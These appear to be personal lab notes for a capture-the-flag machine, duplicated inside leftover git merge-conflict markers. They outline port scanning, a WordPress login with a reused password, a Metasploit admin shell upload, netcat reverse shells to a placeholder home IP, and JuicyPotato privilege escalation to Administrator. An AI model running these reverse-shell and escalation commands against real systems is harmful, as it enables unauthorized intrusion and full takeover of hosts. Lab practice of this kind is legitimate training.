<<<<<<< HEAD
- 10.10.10.29

- nmap for open ports
	- 80: http
		- Microsoft IIS
	- 3306: mysql
		- MySQL
	- no known vulns

- website
	- gobuster
		- → /wordpress, 		
	- on the site, some searches and inputs BUT
	- since it's wordpress - run possible vulns through metasploit

- metasploit the wordpress
	- use previous password (from Vaccine postrgre)
		- `postgres:P@s5w0rd!`
		- guess the login creds combo
	- use login site `/wordpress/wp-login.php`
	- `admin:P@s5w0rd!`
	- version 5.2.1
	- `use unix/webapp/wp_admin_shell_upload)`
		- fill out options
	- → meterpreter
		- change local dir `lcd /home/username/Downloads`
		- `cd C:/inetpub/wwwroot/wordpress/wp-content/uploads`
		- `upload nc.exe`
		- set up listener
		- run the shell from target `execute -f nc.exe -a "-e cmd.exe <HOME_IP> <PORT>"`
		- reverse shell - check

 - privilege escalation
	 - `sysinfo` in meterpreter
		 - Windows Server 2016
	 - upload JuicyPotato.exe
		 - `echo STARTC:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe <HOME_IP> <PORT> > shell.bat`
	 - set up listener
	 - `JuicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337`
=======
- 10.10.10.29

- nmap for open ports
	- 80: http
		- Microsoft IIS
	- 3306: mysql
		- MySQL
	- no known vulns

- website
	- gobuster
		- → /wordpress, 		
	- on the site, some searches and inputs BUT
	- since it's wordpress - run possible vulns through metasploit

- metasploit the wordpress
	- use previous password (from Vaccine postrgre)
		- `postgres:P@s5w0rd!`
		- guess the login creds combo
	- use login site `/wordpress/wp-login.php`
	- `admin:P@s5w0rd!`
	- version 5.2.1
	- `use unix/webapp/wp_admin_shell_upload)`
		- fill out options
	- → meterpreter
		- change local dir `lcd /home/username/Downloads`
		- `cd C:/inetpub/wwwroot/wordpress/wp-content/uploads`
		- `upload nc.exe`
		- set up listener
		- run the shell from target `execute -f nc.exe -a "-e cmd.exe <HOME_IP> <PORT>"`
		- reverse shell - check

 - privilege escalation
	 - `sysinfo` in meterpreter
		 - Windows Server 2016
	 - upload JuicyPotato.exe
		 - `echo STARTC:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe <HOME_IP> <PORT> > shell.bat`
	 - set up listener
	 - `JuicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337`
>>>>>>> ed86870e047cc27b656f2f20735dd248c5953b5d
	 - → you get Administrator